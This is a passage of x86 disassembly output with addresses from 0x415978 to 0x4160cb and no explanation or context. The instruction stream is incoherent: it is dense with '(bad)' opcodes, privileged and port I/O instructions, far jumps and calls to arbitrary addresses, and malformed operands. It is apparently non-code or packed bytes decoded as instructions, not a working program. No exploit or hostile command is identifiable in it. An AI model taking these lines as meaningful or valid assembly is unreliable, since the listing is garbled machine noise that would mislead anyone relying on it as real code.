  415978:	test   DWORD PTR [ebx-0x6bf6557a],edx
  41597e:	addr16 xchg esp,eax
  415980:	cs mov al,0xce
  415983:	xlat   BYTE PTR ds:[ebx]
  415984:	add    al,0x83
  415986:	gs mov ebp,0xdd442096
  41598c:	xlat   BYTE PTR ds:[ebx]
  41598d:	dec    ecx
  41598e:	loope  0x4159c9
  415990:	ret    0x185f
  415993:	xor    eax,DWORD PTR [eax]
  415995:	(bad)  
  415996:	jg     0x415942
  415998:	xchg   DWORD PTR [eax],edx
  41599a:	daa    
  41599b:	adc    BYTE PTR fs:[eax+ecx*4-0x47],0xe1
  4159a1:	push   edi
  4159a2:	fxtract 
  4159a4:	in     eax,dx
  4159a5:	mov    ecx,0xddcce00c
  4159aa:	movsx  esp,BYTE PTR [ecx-0x1f]
  4159ae:	sti    
  4159af:	packuswb mm4,QWORD PTR [ebx-0x3d]
  4159b3:	mov    bh,0x52
  4159b5:	mov    dl,0x93
  4159b7:	sub    al,0x86
  4159b9:	stc    
  4159ba:	lahf   
  4159bb:	test   BYTE PTR [ebx+0x0],al
  4159be:	into   
  4159bf:	sub    BYTE PTR [edx],0x74
  4159c2:	xchg   BYTE PTR [ecx],dl
  4159c4:	fisubr WORD PTR [edx-0x4b]
  4159c7:	add    DWORD PTR [ebp-0x43],ebx
  4159ca:	or     eax,0x755538f2
  4159cf:	cmc    
  4159d0:	push   ebx
  4159d1:	xchg   ecx,eax
  4159d2:	ret    0x9853
  4159d5:	lods   eax,DWORD PTR ds:[esi]
  4159d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4159d7:	and    DWORD PTR [edx],ebp
  4159d9:	sub    BYTE PTR [ebx-0x4c6e8330],0x25
  4159e0:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4159e2:	add    DWORD PTR [edx],ebp
  4159e4:	and    al,0xbc
  4159e6:	xor    ah,ah
  4159e8:	sar    BYTE PTR [eax+0x1c39c308],0xf4
  4159ef:	push   ds
  4159f0:	or     ch,0x89
  4159f3:	xlat   BYTE PTR ds:[ebx]
  4159f4:	ror    ch,1
  4159f6:	std    
  4159f7:	inc    ecx
  4159f8:	xor    bh,BYTE PTR [edx]
  4159fa:	lock dec esi
  4159fc:	lods   al,BYTE PTR ds:[esi]
  4159fd:	push   ecx
  4159fe:	add    BYTE PTR [edx],dl
  415a00:	mov    ds:0x829c69da,al
  415a05:	cmp    al,0xdd
  415a07:	shr    DWORD PTR [ebp+0x1],0x28
  415a0b:	mov    ch,BYTE PTR ds:0xed0d44a6
  415a11:	ds xor eax,0x812f42e0
  415a17:	dec    edx
  415a18:	pusha  
  415a19:	loope  0x4159f8
  415a1b:	nop
  415a1c:	gs mov ah,0x61
  415a1f:	icebp  
  415a20:	fstp   DWORD PTR [ebx+0x72bbdcae]
  415a26:	les    ebx,FWORD PTR [edi+ecx*1+0x7d]
  415a2a:	mov    bl,0xa7
  415a2c:	ret    0x9ad5
  415a2f:	or     BYTE PTR [ecx+0x2be56d69],ah
  415a35:	cmp    edi,DWORD PTR [esp+edx*4+0x16496914]
  415a3c:	clc    
  415a3d:	pop    es
  415a3e:	das    
  415a3f:	loope  0x415a03
  415a41:	enter  0x9dd1,0x8f
  415a45:	dec    eax
  415a46:	fimul  DWORD PTR [esi+0x3babc6e2]
  415a4c:	scas   al,BYTE PTR es:[edi]
  415a4d:	push   esp
  415a4e:	aas    
  415a4f:	fisttp WORD PTR [ecx]
  415a51:	neg    BYTE PTR [eax]
  415a53:	mov    ch,0xfc
  415a55:	loopne 0x415aa4
  415a57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415a58:	sbb    al,0xe9
  415a5a:	mov    cs,WORD PTR [ecx+edx*8]
  415a5d:	int3   
  415a5e:	mov    bl,0x13
  415a60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a61:	cmp    BYTE PTR [eax+0x4c],ah
  415a64:	and    bh,dh
  415a66:	ret    0x585d
  415a69:	adc    eax,0x3c706d8b
  415a6e:	ins    DWORD PTR es:[edi],dx
  415a6f:	es pop edi
  415a71:	cmp    ebx,0x58
  415a74:	cmc    
  415a75:	xchg   ebx,eax
  415a76:	rcr    DWORD PTR [edx-0x20],1
  415a79:	mov    ebp,0xce44a3a8
  415a7e:	test   BYTE PTR [eax],dl
  415a80:	out    0x78,al
  415a82:	stos   DWORD PTR es:[edi],eax
  415a83:	ror    BYTE PTR [ecx+eiz*8-0x2d6f2fa],0x97
  415a8b:	and    DWORD PTR [edi],ebp
  415a8d:	not    DWORD PTR [ebp-0x30]
  415a90:	call   FWORD PTR [ecx-0x16da3339]
  415a96:	mov    bl,0xce
  415a98:	(bad)  
  415a99:	in     eax,0x91
  415a9b:	std    
  415a9c:	dec    esi
  415a9d:	push   esi
  415a9e:	lods   al,BYTE PTR ds:[esi]
  415a9f:	add    edx,DWORD PTR [edi+esi*2]
  415aa2:	or     edx,DWORD PTR [ecx+eax*4-0x701298f5]
  415aa9:	dec    esp
  415aaa:	pop    edx
  415aab:	sbb    esp,DWORD PTR fs:0xac520d7d
  415ab2:	enter  0x3978,0x90
  415ab6:	js     0x415aa7
  415ab8:	fwait
  415ab9:	outs   dx,BYTE PTR ds:[esi]
  415aba:	mov    ebp,0x790424f2
  415abf:	xchg   BYTE PTR [esi+0x4a5ce670],bh
  415ac5:	icebp  
  415ac6:	inc    esi
  415ac7:	cs in  al,0xf9
  415aca:	fs and al,0xc3
  415acd:	out    dx,al
  415ace:	jg     0x415a68
  415ad0:	out    dx,eax
  415ad1:	jae    0x415b47
  415ad3:	mov    dl,0xa8
  415ad5:	mov    al,0xc3
  415ad7:	les    esp,FWORD PTR [esi-0x38]
  415ada:	cmp    ah,BYTE PTR [ebp-0x7]
  415add:	(bad)  
  415ade:	and    al,0xaa
  415ae0:	(bad)  
  415ae2:	mov    dl,0x77
  415ae4:	in     eax,dx
  415ae5:	outs   dx,BYTE PTR ds:[esi]
  415ae6:	mov    cl,0xab
  415ae8:	add    al,0x90
  415aea:	sti    
  415aeb:	or     DWORD PTR [esp+edi*1+0x53],0xa2ba8f7
  415af3:	ja     0x415aca
  415af5:	and    al,BYTE PTR [edi+0x5b]
  415af8:	clc    
  415af9:	out    0x9a,eax
  415afb:	push   ecx
  415afc:	outs   dx,BYTE PTR ds:[esi]
  415afd:	and    ah,cl
  415aff:	js     0x415b13
  415b01:	cmp    eax,0xe34a3fe9
  415b06:	cwde   
  415b07:	rcl    cl,1
  415b09:	jo     0x415ae2
  415b0b:	sbb    DWORD PTR [edx-0x9],edi
  415b0e:	int    0x29
  415b10:	inc    ebp
  415b11:	sti    
  415b12:	push   0xfffffff0
  415b14:	mov    eax,ds:0xb2476253
  415b19:	ficom  DWORD PTR [edx+0x101ec45d]
  415b1f:	jo     0x415b94
  415b21:	pusha  
  415b22:	xor    al,BYTE PTR [edi]
  415b24:	popf   
  415b25:	add    DWORD PTR [esi+0x4e8af712],edx
  415b2b:	fwait
  415b2c:	push   0xffffffb9
  415b2e:	mov    ds:0x44d63bda,eax
  415b33:	js     0x415b7f
  415b35:	cwde   
  415b36:	adc    DWORD PTR [ecx],ecx
  415b38:	clc    
  415b39:	jno    0x415b53
  415b3b:	pop    eax
  415b3c:	and    cl,BYTE PTR [ebx]
  415b3e:	push   ss
  415b3f:	mov    ebp,0x13f9bc85
  415b44:	(bad)  [edi]
  415b46:	imul   esi,DWORD PTR [eax+0x65],0xffffffb9
  415b4a:	inc    edi
  415b4c:	push   edx
  415b4d:	ins    BYTE PTR es:[edi],dx
  415b4e:	dec    ebx
  415b4f:	and    DWORD PTR [ebx-0x55],eax
  415b52:	mov    edx,0x8f41e76f
  415b57:	(bad)  
  415b58:	pop    ebp
  415b59:	mov    dl,BYTE PTR [edi-0x2f]
  415b5c:	and    al,0xb5
  415b5e:	dec    ebx
  415b5f:	retf   0xdcf1
  415b62:	mov    esp,0xc7463446
  415b67:	xor    bl,0x12
  415b6a:	inc    ebp
  415b6b:	dec    BYTE PTR [ecx+0x260a6bbb]
  415b71:	clc    
  415b72:	inc    ebx
  415b73:	cdq    
  415b74:	into   
  415b75:	mov    ebx,0x856d5b1e
  415b7a:	xor    al,0x44
  415b7c:	call   0x800d41ed
  415b81:	repz in al,dx
  415b83:	pusha  
  415b84:	lods   eax,DWORD PTR ds:[esi]
  415b85:	sbb    DWORD PTR [eax-0x76],0x11
  415b89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415b8a:	jecxz  0x415b3f
  415b8c:	push   edx
  415b8d:	push   ds
  415b8e:	fcmove st,st(1)
  415b90:	or     DWORD PTR [ebx],esi
  415b92:	xchg   DWORD PTR [ebx+0x6],eax
  415b95:	sbb    esp,edi
  415b97:	in     eax,dx
  415b98:	xchg   BYTE PTR [eax-0x12e34d4f],ch
  415b9e:	sub    ah,bh
  415ba0:	and    edx,ecx
  415ba2:	pusha  
  415ba3:	ror    DWORD PTR [ebx],1
  415ba5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ba6:	and    al,0x38
  415ba8:	xor    ecx,DWORD PTR [edi-0x7b1a91d9]
  415bae:	push   0x62009f65
  415bb3:	mov    bh,0xe8
  415bb5:	je     0x415bf7
  415bb7:	mov    BYTE PTR [edi+0x67],ah
  415bba:	adc    bl,ah
  415bbc:	and    al,0xf0
  415bbe:	shr    cl,cl
  415bc0:	icebp  
  415bc1:	sub    eax,ecx
  415bc3:	fnsave [esi+eax*4-0x14ca83fa]
  415bca:	ret    
  415bcb:	mov    esi,0xd69e9991
  415bd0:	lea    edx,[ecx]
  415bd2:	sub    ch,bl
  415bd4:	push   ss
  415bd5:	push   es
  415bd6:	cld    
  415bd7:	es das 
  415bd9:	add    eax,0x41a451d9
  415bde:	push   esp
  415bdf:	adc    BYTE PTR ds:0xd24eb51b,0xbe
  415be6:	push   edi
  415be7:	or     ecx,DWORD PTR [edx+0x357d062c]
  415bed:	dec    edi
  415bee:	test   DWORD PTR [ebx-0x46],esp
  415bf1:	in     al,0xfb
  415bf3:	sub    al,0x27
  415bf5:	jae    0x415be5
  415bf7:	and    DWORD PTR [esi-0x34],esi
  415bfa:	push   ebx
  415bfb:	and    al,0x4b
  415bfd:	cld    
  415bfe:	in     al,dx
  415bff:	mov    esp,0x3918d8f9
  415c04:	imul   esp,DWORD PTR [ecx-0x2e],0x82eade50
  415c0b:	adc    cl,BYTE PTR [edi]
  415c0d:	inc    esp
  415c0e:	push   ebp
  415c0f:	mov    ds:0x1f7b293f,eax
  415c14:	adc    al,0xe0
  415c16:	in     al,0x31
  415c18:	add    DWORD PTR [esi+0x68ba53c0],eax
  415c1e:	popa   
  415c1f:	xlat   BYTE PTR ds:[ebx]
  415c20:	fdivr  st(1),st
  415c22:	retf   
  415c23:	jmp    0x82f5:0x6acaa0bb
  415c2a:	mov    al,0x44
  415c2c:	ss inc edx
  415c2e:	out    0xbd,al
  415c30:	inc    esi
  415c31:	imul   esp,esp,0x8110e9ef
  415c37:	repnz mov ah,0x6c
  415c3a:	jg     0x415c43
  415c3c:	loope  0x415cb9
  415c3e:	shl    DWORD PTR [ecx],cl
  415c40:	jmp    0xbbe:0x66787987
  415c47:	nop
  415c48:	push   0x35
  415c4a:	das    
  415c4b:	stos   DWORD PTR es:[edi],eax
  415c4c:	or     esi,edx
  415c4e:	xor    ebx,esp
  415c50:	outs   dx,BYTE PTR ds:[esi]
  415c51:	push   ebp
  415c52:	dec    ecx
  415c53:	lock ds arpl di,ax
  415c57:	xchg   ecx,eax
  415c58:	test   BYTE PTR [ecx+0x68],ch
  415c5b:	xchg   ecx,eax
  415c5c:	bound  edx,QWORD PTR [ebp-0x1035a6c7]
  415c62:	ins    BYTE PTR es:[edi],dx
  415c63:	(bad)  
  415c64:	daa    
  415c65:	cmp    DWORD PTR [eax-0x2416b28f],0xffffff9d
  415c6c:	scas   eax,DWORD PTR es:[edi]
  415c6d:	fild   QWORD PTR [ebp+0x73]
  415c70:	das    
  415c71:	push   ds
  415c72:	dec    ebp
  415c73:	and    BYTE PTR [ebx+0x3],bh
  415c76:	int    0x99
  415c78:	push   ss
  415c79:	(bad)  
  415c7a:	mov    WORD PTR [ecx+0x13],cs
  415c7d:	(bad)  
  415c7e:	je     0x415cad
  415c80:	clc    
  415c81:	leave  
  415c82:	pop    es
  415c83:	xor    eax,0xd829dd7b
  415c88:	adc    DWORD PTR [eax-0x69],ecx
  415c8b:	cmp    eax,0x646439f
  415c90:	inc    esi
  415c91:	xchg   DWORD PTR [eax+0xa],eax
  415c94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c95:	enter  0xc602,0x40
  415c99:	inc    esp
  415c9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c9b:	imul   eax,DWORD PTR [ebp+0x485dd0b4],0xffffffb1
  415ca2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ca3:	sbb    DWORD PTR [edi-0x28698c06],0xffffffe1
  415caa:	sbb    DWORD PTR [edx+0x50142f52],ebp
  415cb0:	lods   al,BYTE PTR ds:[esi]
  415cb1:	adc    al,BYTE PTR [edx+0x4]
  415cb4:	cmp    eax,0x3ad52873
  415cb9:	jns    0x415cb0
  415cbb:	mov    edi,gs
  415cbd:	cld    
  415cbe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415cbf:	data16 aad 0xfc
  415cc2:	stos   BYTE PTR es:[edi],al
  415cc3:	xor    BYTE PTR [edx+0x1b],cl
  415cc6:	mov    eax,0xf5be8549
  415ccb:	inc    dh
  415ccd:	xor    DWORD PTR [edx],esp
  415ccf:	out    dx,al
  415cd0:	daa    
  415cd1:	scas   eax,DWORD PTR es:[edi]
  415cd2:	dec    esi
  415cd3:	xor    al,0xff
  415cd5:	mov    ch,0x58
  415cd7:	xchg   DWORD PTR [ecx-0x53],edi
  415cda:	imul   esi,DWORD PTR [ecx-0x43],0x135d45fe
  415ce1:	push   0xb8770d28
  415ce6:	rol    BYTE PTR [edx-0x3b],0x11
  415cea:	retf   
  415ceb:	(bad)  
  415cec:	scas   al,BYTE PTR es:[edi]
  415ced:	inc    esp
  415cee:	push   ecx
  415cef:	and    BYTE PTR [ecx+ebp*4],ah
  415cf2:	inc    ebp
  415cf3:	mov    BYTE PTR [esi+0x4afd72f0],dl
  415cf9:	mov    bl,0xfc
  415cfb:	hlt    
  415cfc:	mov    bl,0xe4
  415cfe:	mov    bh,0x6f
  415d00:	sbb    dh,dh
  415d02:	int3   
  415d03:	ret    0xb5ca
  415d06:	cmp    eax,DWORD PTR [esp+eiz*8]
  415d09:	mov    ah,0x2
  415d0b:	sbb    al,0x80
  415d0d:	pop    ecx
  415d0e:	(bad)  
  415d0f:	mov    ah,0x87
  415d11:	rcr    BYTE PTR [eax+ebp*2+0x4],0xd7
  415d16:	pop    eax
  415d17:	pop    ds
  415d18:	inc    esp
  415d19:	push   0x0
  415d1b:	and    eax,DWORD PTR [ebx-0x64]
  415d1e:	shl    BYTE PTR [esi+eax*4],1
  415d21:	fisubr DWORD PTR [edi]
  415d23:	sub    al,0x82
  415d25:	jg     0x415d0d
  415d27:	fucomi st,st(0)
  415d29:	mov    eax,0xc450dcc4
  415d2e:	in     al,dx
  415d2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415d30:	retf   
  415d31:	lock fsubp st(7),st
  415d34:	sbb    DWORD PTR [ebx],eax
  415d36:	fistp  WORD PTR [ebp+0xa3354a9]
  415d3c:	loop   0x415d9e
  415d3e:	sub    ch,BYTE PTR [edi-0x6c]
  415d41:	fisubr DWORD PTR [ebx]
  415d43:	ja     0x415cf8
  415d45:	mov    esp,0x91b3da4b
  415d4a:	pop    ss
  415d4b:	and    al,0x91
  415d4d:	push   0x51
  415d4f:	jmp    0xf920:0x50c2d3d0
  415d56:	push   ss
  415d57:	sbb    dh,al
  415d59:	xchg   edx,eax
  415d5a:	cmp    eax,0x77b74bd8
  415d5f:	and    al,0xbd
  415d61:	jae    0x415d02
  415d63:	enter  0x4f86,0xc1
  415d67:	mov    cs,ecx
  415d69:	dec    edx
  415d6a:	repz or cl,BYTE PTR [ebp+0x2c]
  415d6e:	sub    DWORD PTR [ebx+0x43],eax
  415d71:	sub    al,0xd4
  415d73:	push   ecx
  415d74:	and    bl,cl
  415d76:	outs   dx,DWORD PTR ds:[esi]
  415d77:	shr    BYTE PTR [eax+eiz*4-0x51],1
  415d7b:	push   0x1851ecdf
  415d80:	ret    
  415d81:	or     DWORD PTR [edi+edx*1+0x204eaa17],edi
  415d88:	and    BYTE PTR [ebp+0x3],bl
  415d8b:	push   0x84682149
  415d90:	push   ecx
  415d91:	cmp    BYTE PTR [esp+edi*2+0x72],al
  415d95:	call   0x3a7b57ef
  415d9a:	shl    BYTE PTR [edx],1
  415d9c:	lock push cs
  415d9e:	mov    edi,0x6af19b54
  415da3:	jecxz  0x415d49
  415da5:	jecxz  0x415df6
  415da7:	push   edx
  415da8:	jnp    0x415d31
  415daa:	out    dx,eax
  415dab:	or     al,0x28
  415dad:	jp     0x415e24
  415daf:	sub    ebx,DWORD PTR [eax-0xbe8e1c0]
  415db5:	jle    0x415df5
  415db7:	pop    eax
  415db8:	push   es
  415db9:	call   0x8ad95fb4
  415dbe:	xor    eax,0x5a3e823
  415dc3:	pop    ebx
  415dc4:	mov    al,0xea
  415dc6:	xchg   DWORD PTR [edi+0x21],edx
  415dc9:	call   0x220416f1
  415dce:	pop    ecx
  415dcf:	sbb    eax,0x55ecee89
  415dd4:	mov    dl,0x98
  415dd6:	mov    dl,0x70
  415dd8:	addr16 test eax,0x99eff3f2
  415dde:	test   al,0xee
  415de0:	(bad)  
  415de1:	adc    al,0x4c
  415de3:	clc    
  415de4:	xor    eax,0xe039536e
  415de9:	sub    bl,BYTE PTR [edx-0x2c]
  415dec:	jge    0x415d8e
  415dee:	jbe    0x415d95
  415df0:	nop
  415df1:	or     bl,al
  415df3:	inc    ebx
  415df4:	(bad)  
  415df5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415df6:	push   ss
  415df7:	sub    eax,edi
  415df9:	mov    eax,ds:0x924789c6
  415dfe:	(bad)
  415e02:	test   eax,0x64515f63
  415e07:	je     0x415e54
  415e09:	mov    edx,edi
  415e0b:	or     eax,0x7665e93c
  415e10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415e11:	(bad)  
  415e12:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e13:	lods   al,BYTE PTR ds:[esi]
  415e14:	push   edx
  415e15:	xchg   ebx,eax
  415e16:	add    al,0xfb
  415e18:	inc    ebp
  415e19:	and    bh,BYTE PTR [ebp-0x51]
  415e1c:	sub    dh,dh
  415e1e:	sub    ebx,ebp
  415e20:	jge    0x415dbb
  415e22:	je     0x415e6b
  415e24:	clc    
  415e25:	mov    edx,0x45e7793a
  415e2a:	sub    DWORD PTR [ebx+0x6c],ebp
  415e2d:	pop    eax
  415e2e:	push   ecx
  415e2f:	and    al,0xd6
  415e31:	fsub   QWORD PTR [ecx]
  415e33:	fwait
  415e34:	cld    
  415e35:	and    bl,ch
  415e37:	mov    al,0x4
  415e39:	pop    ss
  415e3a:	cwde   
  415e3b:	stc    
  415e3c:	lods   al,BYTE PTR ds:[esi]
  415e3d:	dec    esp
  415e3e:	(bad)  
  415e40:	sub    DWORD PTR [ecx+0x77],esp
  415e43:	js     0x415e0c
  415e45:	mov    esp,0x749e41cd
  415e4a:	bswap  ebx
  415e4c:	cmp    ecx,DWORD PTR [ebx+0x16]
  415e4f:	push   eax
  415e50:	not    BYTE PTR [edi]
  415e52:	aam    0x42
  415e54:	scas   al,BYTE PTR es:[edi]
  415e55:	out    dx,al
  415e56:	dec    edi
  415e57:	xchg   esi,eax
  415e58:	enter  0xf9d6,0xf5
  415e5c:	mov    cl,0xa2
  415e5e:	and    al,0x78
  415e60:	scas   eax,DWORD PTR es:[edi]
  415e61:	mov    ds:0x776da7c5,al
  415e66:	(bad)  
  415e67:	in     al,0x5f
  415e69:	mov    esi,0x6ecab44a
  415e6e:	pop    ebx
  415e6f:	ja     0x415e29
  415e71:	dec    esp
  415e72:	stc    
  415e73:	sub    eax,0x26e3f687
  415e78:	(bad)  
  415e79:	pop    ebp
  415e7a:	pop    ebp
  415e7b:	cmc    
  415e7c:	add    al,0x85
  415e7e:	xlat   BYTE PTR ds:[ebx]
  415e7f:	sub    eax,0xc1d33d39
  415e84:	sar    ecx,0x7d
  415e87:	dec    edi
  415e88:	fnstcw WORD PTR ds:0x8d556e2a
  415e8e:	cmp    eax,0xc39f4299
  415e93:	inc    eax
  415e94:	sti    
  415e95:	add    DWORD PTR [ecx-0x21],0xffffffb6
  415e99:	push   edx
  415e9a:	repz xchg edx,eax
  415e9c:	jmp    0x4b5f27d0
  415ea1:	mov    DWORD PTR [ecx+0x2a9d15b9],eax
  415ea7:	inc    ebx
  415ea8:	popa   
  415ea9:	push   cs
  415eaa:	out    dx,al
  415eab:	aad    0x20
  415ead:	lahf   
  415eae:	int    0xd4
  415eb0:	xor    BYTE PTR [edi+0x7],al
  415eb3:	imul   eax,DWORD PTR [edi],0x5b
  415eb6:	inc    edi
  415eb7:	mov    bh,0x96
  415eb9:	not    BYTE PTR [edx-0x29]
  415ebc:	mov    ch,0x3c
  415ebe:	push   cs
  415ebf:	fisub  DWORD PTR [ebp+0x5ea98880]
  415ec5:	sbb    al,0xc7
  415ec7:	imul   ebp,DWORD PTR [esi*4+0x4ff67ed7],0xe812bc8c
  415ed2:	fmulp  st(1),st
  415ed4:	mov    DWORD PTR [ebp+0x3be0bc93],ecx
  415eda:	xchg   edi,eax
  415edb:	jle    0x415e6d
  415edd:	or     ebp,esi
  415edf:	test   ah,cl
  415ee1:	cs jbe 0x415ecd
  415ee4:	cmp    ebp,DWORD PTR [ebx+0x19]
  415ee7:	dec    ebp
  415ee8:	sub    bh,0xd
  415eeb:	das    
  415eec:	xchg   ecx,eax
  415eed:	xor    ch,BYTE PTR [ecx-0x6cb349c3]
  415ef3:	push   ebp
  415ef4:	nop
  415ef5:	xchg   edx,eax
  415ef6:	xchg   ebp,eax
  415ef7:	fsub   QWORD PTR [ebx+0x53]
  415efa:	int    0xf0
  415efc:	or     ah,BYTE PTR [ecx-0x2b]
  415eff:	push   esp
  415f00:	test   ebx,ebx
  415f02:	cmp    dl,BYTE PTR [eax]
  415f04:	inc    edi
  415f05:	arpl   WORD PTR [edi],bx
  415f07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415f08:	test   al,0x3
  415f0a:	inc    esp
  415f0b:	scas   eax,DWORD PTR es:[edi]
  415f0c:	(bad)  
  415f0d:	mov    al,0xdc
  415f0f:	pop    ds
  415f10:	sub    BYTE PTR [edx-0x5e0bc7a2],ch
  415f16:	jmp    0x415f0f
  415f18:	or     dl,BYTE PTR [bx-0x63]
  415f1c:	push   ss
  415f1d:	outs   dx,DWORD PTR ds:[esi]
  415f1e:	mov    bh,0x5e
  415f20:	in     eax,dx
  415f21:	mov    cl,0x6e
  415f23:	inc    edx
  415f24:	mov    ch,0xff
  415f26:	cmp    DWORD PTR [ecx-0x4a],ecx
  415f29:	mov    ds:0x18e37efb,al
  415f2e:	or     al,0x3b
  415f30:	std    
  415f31:	push   es
  415f32:	inc    ebp
  415f33:	xchg   BYTE PTR [edi-0x12029d75],ch
  415f39:	jmp    0x415f5c
  415f3b:	jne    0x415f5f
  415f3d:	dec    ebp
  415f3e:	enter  0x8678,0x7b
  415f42:	inc    ebx
  415f43:	mov    bl,0x26
  415f45:	ja     0x415f68
  415f47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f48:	dec    ebp
  415f49:	mov    edi,ds
  415f4b:	cmp    edi,edx
  415f4d:	cmc    
  415f4e:	out    0x7,al
  415f50:	push   cs
  415f51:	jb     0x415edb
  415f53:	dec    ebp
  415f54:	mov    esp,0x435125b2
  415f59:	mov    ?,WORD PTR [ebx-0x40]
  415f5c:	outs   dx,DWORD PTR ds:[esi]
  415f5d:	add    al,0x39
  415f5f:	dec    edx
  415f60:	or     DWORD PTR [ecx-0x2b],0x93d2113
  415f67:	nop
  415f68:	in     al,0xf0
  415f6a:	bound  ecx,QWORD PTR [esi+0x63]
  415f6d:	sbb    edi,edi
  415f6f:	rcl    BYTE PTR [edx],cl
  415f71:	pop    es
  415f72:	mov    edi,0x59e3464
  415f77:	call   0xb6afd78d
  415f7c:	or     cl,dh
  415f7e:	sbb    edi,ebx
  415f80:	push   ss
  415f81:	cmp    eax,0x88ad4891
  415f86:	sar    DWORD PTR [eax+0x2],1
  415f89:	inc    edi
  415f8a:	loop   0x415fd1
  415f8c:	adc    al,0x2a
  415f8e:	in     eax,0xb9
  415f90:	in     al,dx
  415f91:	gs mov dh,0x6d
  415f94:	push   ecx
  415f95:	dec    esi
  415f96:	nop
  415f97:	rcl    esp,1
  415f99:	adc    al,0x33
  415f9b:	fdiv   QWORD PTR [edi]
  415f9d:	popf   
  415f9e:	call   0x89363cc7
  415fa3:	xor    ch,BYTE PTR [ecx+0x2f]
  415fa6:	fsub   DWORD PTR [edx]
  415fa8:	out    0x9e,eax
  415faa:	imul   esp,DWORD PTR [ebx],0x32
  415fad:	jo     0x416014
  415faf:	(bad)  
  415fb1:	xor    ah,ch
  415fb3:	mov    dh,0x97
  415fb5:	ret    
  415fb6:	sbb    eax,0xf9b6513f
  415fbb:	es mov ebp,0x505f6576
  415fc1:	clts   
  415fc3:	lock popf 
  415fc5:	sar    DWORD PTR [esp+eax*1],0x60
  415fc9:	push   esp
  415fca:	sbb    BYTE PTR [ebp-0x27],ch
  415fcd:	mov    ds:0x7f750c7d,al
  415fd2:	cmp    DWORD PTR [esi+0x2782c210],esi
  415fd8:	push   es
  415fd9:	and    DWORD PTR [ebx+0x5ea2ce13],edi
  415fdf:	jp     0x415fb8
  415fe1:	add    dl,BYTE PTR [eax-0x7f]
  415fe4:	add    dh,BYTE PTR [ecx]
  415fe6:	imul   edx,DWORD PTR [edx],0x6f
  415fe9:	or     DWORD PTR [edx+0x7a],edx
  415fec:	sub    ah,BYTE PTR [esi+0x6bc1dd5d]
  415ff2:	es cs mov bl,0xff
  415ff6:	add    al,bh
  415ff8:	aas    
  415ff9:	cwde   
  415ffa:	je     0x415fe8
  415ffc:	clc    
  415ffd:	int    0xa1
  415fff:	push   ecx
  416000:	jo     0x416037
  416002:	out    dx,eax
  416003:	mov    ?,WORD PTR [edx-0x2537ab3d]
  416009:	retf   
  41600a:	xor    BYTE PTR [edx+0x3b],ah
  41600d:	sbb    DWORD PTR [ecx],esi
  41600f:	jg     0x415fa4
  416011:	inc    eax
  416012:	jge    0x41606e
  416014:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416015:	inc    ecx
  416016:	mov    bl,0xc7
  416018:	rol    bh,cl
  41601a:	push   edi
  41601b:	into   
  41601c:	inc    eax
  41601d:	xchg   esi,eax
  41601e:	jbe    0x416050
  416020:	cmp    edi,esp
  416022:	arpl   cx,cx
  416024:	adc    cl,BYTE PTR [eax]
  416026:	mov    ?,WORD PTR [ebx]
  416028:	xor    dl,0x27
  41602b:	xchg   edx,eax
  41602c:	test   al,0x6d
  41602e:	test   eax,0x4a3077f2
  416033:	mov    ds:0x7d19f7c4,eax
  416038:	mov    eax,0xfcc9afef
  41603d:	jo     0x415fd0
  41603f:	ja     0x416017
  416041:	jnp    0x416044
  416043:	scas   al,BYTE PTR es:[edi]
  416044:	(bad)  
  416045:	ds xchg bl,dl
  416048:	scas   eax,DWORD PTR es:[edi]
  416049:	out    dx,eax
  41604a:	stos   BYTE PTR es:[edi],al
  41604b:	popa   
  41604c:	mov    bl,0xf
  41604e:	cwde   
  41604f:	fsubr  st,st(6)
  416051:	jp     0x416026
  416053:	popa   
  416054:	cmc    
  416055:	sub    esi,DWORD PTR [ecx*8-0x5298bcb1]
  41605c:	xchg   edi,eax
  41605d:	dec    edx
  41605e:	jecxz  0x415ff3
  416060:	bound  esi,QWORD PTR [edi]
  416062:	sub    al,0xa3
  416064:	inc    eax
  416065:	scas   eax,DWORD PTR es:[edi]
  416066:	xor    eax,0xcd1d4157
  41606b:	popf   
  41606c:	push   es
  41606d:	jmp    DWORD PTR [ebp-0x29]
  416070:	call   0xaf57:0x235a767c
  416077:	mov    ecx,0xaca124d7
  41607c:	push   ds
  41607d:	or     dh,dh
  41607f:	jmp    0x2e6aa7dc
  416084:	push   0xffffffa4
  416086:	xchg   BYTE PTR [edx+0x64],ah
  416089:	or     eax,0xc8715e6f
  41608e:	dec    edx
  41608f:	dec    ecx
  416090:	fdiv   DWORD PTR [edx-0x4f]
  416093:	pop    ds
  416094:	rcl    DWORD PTR [edx+0x4b1d4bf2],1
  41609a:	into   
  41609b:	fs stc 
  41609d:	mov    ecx,0x72cfbaa8
  4160a2:	sub    DWORD PTR [ecx],esp
  4160a4:	push   esi
  4160a5:	cmp    dl,BYTE PTR [ebx-0x578c6721]
  4160ab:	push   esp
  4160ac:	ror    BYTE PTR [esi-0x55],1
  4160af:	xchg   ebx,eax
  4160b0:	pop    esi
  4160b1:	gs inc esp
  4160b3:	retf   
  4160b4:	out    dx,eax
  4160b5:	push   ebx
  4160b6:	adc    esi,DWORD PTR [esi+0x45]
  4160b9:	ret    0x457d
  4160bc:	cld    
  4160bd:	ins    DWORD PTR es:[edi],dx
  4160be:	push   0x57
  4160c0:	pop    esi
  4160c1:	retf   0x3521
  4160c4:	out    0x3e,al
  4160c6:	test   BYTE PTR [ebx+0x38],bl
  4160c9:	adc    DWORD PTR [esi],edx
  4160cb:	loop   0x4160cd
